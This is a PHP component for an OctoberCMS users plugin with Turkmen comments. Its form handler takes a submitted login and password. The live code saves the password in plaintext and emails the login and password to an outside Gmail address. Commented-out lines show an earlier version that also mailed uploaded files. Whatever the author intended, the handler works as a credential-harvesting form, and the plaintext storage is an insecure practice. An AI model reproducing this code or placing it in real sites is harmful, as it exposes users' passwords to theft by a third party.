<?php 

namespace Atash\Users\Components;
use Input;
use Mail;
use Flash;
use Atash\Users\Models\Users;

use Cms\Classes\ComponentBase;

// Maglumat => components ichindaki at

class Form_2 extends ComponentBase
{
    public function componentDetails()
    {
        return [
            'name' => 'form_2_name',
            'description' => 'form_2_description'
        ];
    }


    public function onSend()
   {
       $users = new Users();
     //  $a=$users->file_m =Input::file('file_f');
   
     //  $users->save();
     
    // $login = Input::get('login');
      //   $pwd = Input::get('pwd');
   
     //    if($login and $pwd)
     //    {
    //         Flash::success($login .$pwd);
    //     }
     // //    else{
     //       Flash::error("no");
    //     }
    
    
    $login=$users->login =Input::get('login');
    $pwd=$users->pwd =Input::get('pwd');
    $users->save();

          $vars = [
         'login' => $login,
         'pwd' => $pwd,
          ];

        //  Mail::send('atash.users::mail.message', $vars, function($message) use ($a) {

        // $message->to('gerchekgerchek1@gmail.com', 'Admin Person');
        // $message->subject('This is a reminder');
        // $message->attach(
        //     $a->getRealPath(),array(
        //         'as'=>$a->getClientOriginalName(),
        //         'mime'=>$a->getMimeType()
        //     )
        // );

        //   });
        //      return true;























    //                  dogry start   
    // $vars = [
    //     'email' => Input::get('email'),
    //     'password' => Input::get('password'),
    // ];

     Mail::send('atash.users::mail.message_2', $vars, function($message) {

         $message->to('gerchekgerchek1@gmail.com', 'Admin Person');
         $message->subject('This is a reminder');

     });
     return true;
    //                  dogry end
    
    }
    
}